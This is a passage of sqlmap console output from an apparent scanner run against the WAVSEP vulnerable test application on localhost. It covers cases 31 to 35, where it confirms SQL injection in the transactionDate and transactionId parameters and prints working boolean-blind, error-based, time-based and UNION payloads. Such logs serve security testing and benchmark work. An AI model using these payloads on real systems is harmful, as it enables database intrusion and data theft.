    Payload: transactionDate=2010-01-01' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178767671,0x52756542766b666c53714c42676f6568717459536465656e596246726f7947546564644573784a71,0x71716b6a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:51:07] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[31/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:51:07] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp?transactionDate=2010-01-01'                                                                                                  
[04:51:07] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=86AAE33D7AC...3E01544BEF'). Do you want to use those [Y/n] Y
[04:51:07] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:51:07] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:51:07] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[04:51:07] [INFO] heuristic (XSS) test shows that GET parameter 'transactionDate' might be vulnerable to cross-site scripting (XSS) attacks
[04:51:07] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:51:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:51:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:51:08] [WARNING] reflective value(s) found and filtering out
[04:51:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:51:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:51:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:51:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:51:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:51:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:51:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:51:10] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:51:10] [INFO] testing 'Generic inline queries'
[04:51:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:51:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:51:11] [INFO] GET parameter 'transactionDate' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:51:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:51:11] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:51:11] [INFO] testing 'MySQL inline queries'
[04:51:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:51:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:51:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:51:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:51:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:51:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:51:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:51:21] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:51:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:51:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:51:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:51:21] [INFO] target URL appears to have 4 columns in query
[04:51:21] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 805 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionDate=2010-01-01' RLIKE (SELECT (CASE WHEN (2853=2853) THEN 0x323031302d30312d3031 ELSE 0x28 END))-- CBYf

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-01-01' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71716a7171,(SELECT (ELT(1555=1555,1))),0x716b626a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- FHAZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 5028 FROM (SELECT(SLEEP(5)))QkHE)-- mPhM

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-01-01' UNION ALL SELECT NULL,CONCAT(0x71716a7171,0x45504d47684c6c4b74725459595a46545052694f7a6a44504f444251765842797151505772497547,0x716b626a71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:51:21] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[32/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:51:21] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp?transactionDate=2010-01-01'                                                                                                  
[04:51:21] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=39F41201500...E218C87F47'). Do you want to use those [Y/n] Y
[04:51:21] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:51:21] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:51:21] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[04:51:21] [INFO] heuristic (XSS) test shows that GET parameter 'transactionDate' might be vulnerable to cross-site scripting (XSS) attacks
[04:51:21] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:51:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:51:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:51:22] [WARNING] reflective value(s) found and filtering out
[04:51:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:51:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:51:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:51:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:51:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:51:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:51:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:51:24] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:51:24] [INFO] testing 'Generic inline queries'
[04:51:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:51:25] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:51:25] [INFO] GET parameter 'transactionDate' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:51:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:51:25] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:51:25] [INFO] testing 'MySQL inline queries'
[04:51:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:51:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:51:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:51:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:51:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:51:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:51:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:51:35] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:51:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:51:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:51:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:51:35] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:51:35] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:51:35] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:51:35] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:51:35] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:51:35] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:51:36] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:51:36] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:51:36] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:51:36] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:51:36] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:51:37] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:51:37] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1200 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionDate=2010-01-01' RLIKE (SELECT (CASE WHEN (5703=5703) THEN 0x323031302d30312d3031 ELSE 0x28 END))-- Lfeq

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-01-01' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71766a7671,(SELECT (ELT(7348=7348,1))),0x71766b7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- ZCZG

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 5720 FROM (SELECT(SLEEP(5)))PWJP)-- XwoN
---
do you want to exploit this SQL injection? [Y/n] Y
[04:51:37] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[33/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[04:51:37] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp?transactionDate=2010-02-02'                                                                                              
[04:51:37] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=7D2DC099AF7...609419FE8F'). Do you want to use those [Y/n] Y
[04:51:37] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:51:37] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:51:37] [INFO] heuristic (basic) test shows that GET parameter 'transactionDate' might be injectable (possible DBMS: 'MySQL')
[04:51:37] [INFO] heuristic (XSS) test shows that GET parameter 'transactionDate' might be vulnerable to cross-site scripting (XSS) attacks
[04:51:37] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:51:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:51:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:51:37] [WARNING] reflective value(s) found and filtering out
[04:51:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:51:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:51:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:51:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:51:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:51:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:51:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:51:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:51:40] [INFO] testing 'Generic inline queries'
[04:51:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:51:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:51:41] [INFO] GET parameter 'transactionDate' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:51:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:51:41] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:51:41] [INFO] testing 'MySQL inline queries'
[04:51:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:51:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:51:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:51:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:51:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:51:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:51:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:51:51] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:51:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:51:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:51:51] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:51:51] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:51:51] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:51:51] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:51:51] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:51:51] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:51:51] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:51:52] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:51:52] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:51:52] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:51:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:51:52] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:51:52] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:51:52] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:51:52] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:51:53] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:51:53] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:51:53] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:51:53] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1173 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionDate=2010-02-02' RLIKE (SELECT (CASE WHEN (3545=3545) THEN 0x323031302d30322d3032 ELSE 0x28 END))-- zdAe

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-02-02' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71766b6271,(SELECT (ELT(1117=1117,1))),0x71786a7071,0x78))s), 8446744073709551610, 8446744073709551610)))-- YfbM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02' AND (SELECT 9287 FROM (SELECT(SLEEP(5)))yGuo)-- SNUh
---
do you want to exploit this SQL injection? [Y/n] Y
[04:51:53] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[34/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp?transactionDate=2010-02-02
do you want to test this URL? [Y/n/q]
> Y
[04:51:53] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp?transactionDate=2010-02-02'                                                                                     
[04:51:53] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=8D81064C55E...AD7C7A395D'). Do you want to use those [Y/n] Y
[04:51:53] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:51:53] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:51:53] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:51:53] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:51:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:51:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:51:54] [WARNING] reflective value(s) found and filtering out
[04:51:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:51:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:51:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:51:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:51:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:51:56] [INFO] testing 'Generic inline queries'
[04:51:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:51:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:51:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:51:56] [INFO] GET parameter 'transactionDate' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:51:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:51:56] [INFO] GET parameter 'transactionDate' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:51:56] [INFO] testing 'MySQL inline queries'
[04:51:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:51:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:51:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:51:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:51:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:51:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:51:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:52:06] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:52:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:52:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:52:06] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:52:06] [INFO] target URL appears to have 4 columns in query
[04:52:06] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 800 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionDate=2010-02-02 RLIKE (SELECT (CASE WHEN (5407=5407) THEN 0x323031302d30322d3032 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionDate=2010-02-02 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71716a6271,(SELECT (ELT(7256=7256,1))),0x717a6a7a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-02-02 AND (SELECT 8051 FROM (SELECT(SLEEP(5)))HJYU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-02-02 UNION ALL SELECT NULL,NULL,CONCAT(0x71716a6271,0x6741514c42745a4f4650515759704c5270645072516d614d687551466a754a4b4f41784471546c42,0x717a6a7a71),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:52:06] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[35/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[04:52:06] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp?transactionId=132'                                                                                         
[04:52:06] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=A566D930B44...A4CC26B169'). Do you want to use those [Y/n] Y
[04:52:06] [INFO] testing if GET parameter 'transactionId' is dynamic
[04:52:06] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[04:52:06] [WARNING] heuristic (basic) test shows that GET parameter 'transactionId' might not be injectable
[04:52:06] [INFO] testing for SQL injection on GET parameter 'transactionId'
[04:52:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:52:06] [WARNING] reflective value(s) found and filtering out
[04:52:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:52:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:52:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:52:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:52:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:52:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:52:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:52:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:52:08] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:52:09] [INFO] testing 'Generic inline queries'
[04:52:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:52:09] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:52:09] [INFO] GET parameter 'transactionId' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:52:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:52:09] [INFO] GET parameter 'transactionId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:52:09] [INFO] testing 'MySQL inline queries'
[04:52:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:52:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:52:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:52:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
